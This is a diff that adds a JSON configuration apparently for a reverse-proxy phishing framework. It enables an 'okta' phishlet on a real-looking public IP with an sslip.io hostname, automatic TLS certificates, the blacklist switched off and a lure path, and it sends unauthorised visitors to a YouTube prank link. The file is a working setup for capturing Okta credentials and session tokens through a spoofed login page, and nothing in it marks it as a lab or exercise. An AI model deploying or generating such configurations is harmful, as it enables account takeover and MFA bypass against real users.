@@ -1,0 +1,46 @@
+{
+  "blacklist": {
+    "mode": "off"
+  },
+  "general": {
+    "autocert": true,
+    "bind_ipv4": "",
+    "dns_port": 53,
+    "domain": "66.135.27.142.sslip.io",
+    "external_ipv4": "66.135.27.142",
+    "https_port": 443,
+    "ipv4": "",
+    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  },
+  "lures": [
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/cqXEQJJg",
+      "paused": 0,
+      "phishlet": "okta",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    }
+  ],
+  "phishlets": {
+    "example": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "okta": {
+      "hostname": "66.135.27.142.sslip.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    }
+  }
+}
